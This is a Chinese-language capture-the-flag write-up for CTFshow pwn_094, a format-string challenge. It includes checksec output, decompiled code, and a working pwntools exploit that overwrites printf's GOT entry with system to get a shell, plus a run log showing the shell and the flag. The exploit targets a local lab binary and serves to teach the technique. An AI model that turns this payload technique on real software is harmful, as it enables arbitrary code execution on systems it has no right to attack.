# CTFshow-pwn_094
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（较大数据任意写）
## 解题思路
> 格式化字符串覆写 got 表

仅开启 NX 且为部分 RELRO  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_094
[*] '/home/mrw/CTFshow/pwn_094'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```
 
漏洞函数和主函数伪代码如下  
```c
void sys()
{
  system("echo Write here!");
}
void __noreturn ctfshow()
{
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v1; // [esp+6Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  while ( 1 )
  {
    memset(buf, 0, sizeof(buf));
    read(0, buf, 0x64u);
    printf(buf);
  }
}
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init();
  logo();
  ctfshow();
}
```
- printf 的 format 字符串中若出现多余的格式符将会自动把栈上的数据作为格式符参数  
- 程序中有 system 函数，同时支持多次触发，且未开启 PIE
- 可以利用格式化字符串漏洞覆写 printf@got 为 system@plt+6（即初始化 system@got 的执行位置），再输入 "/bin/sh" 即可提权 
- 经过调试发现输入为 printf 的第6个参数
- 对于过大的数据，可以分成若干个字节进行读写，逐字节写入，需要注意按每个字节的大小顺序输出字符并写入（因为显然写入之后输出的字符只能增多）

**exp如下**
```python
from pwn import *
p = process('./pwn_094')
printf_got = 0x0804a010
system_plt = 0x08048400
payload = b'%4c%17$hhn%2c%18$hhn%2c%19$hhn%124c%20$hhn__' + p32(printf_got+2) + p32(printf_got+0) + p32(printf_got+3) + p32(printf_got+1)
# 之后的题目就直接用 pwntools 的 fmtstr_payload 工具了 payload = fmtstr_payload(6, {printf_got:system_plt+6})
p.send(payload)
p.send(b'/bin/sh\x00')
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_094.py
[+] Starting local process './pwn_094': pid 25534
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Write any address !                                     
    * *************************************                           
   h d \xe5                                                                                                                           \x10__\x12\xa0\x0\x10\xa0\x0\x13\xa0\x0\x11\xa0\x0/bin
$ ls /
bin           dev     lib32            media  run               swap.img
bin.usr-is-merged  etc     lib64            mnt    sbin               sys
boot           flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom           home  libx32            proc   snap               usr
ctfshow_flag       lib     lost+found        root   srv               var
$ cat /ctfshow_flag
flag{Success!}
$  
```
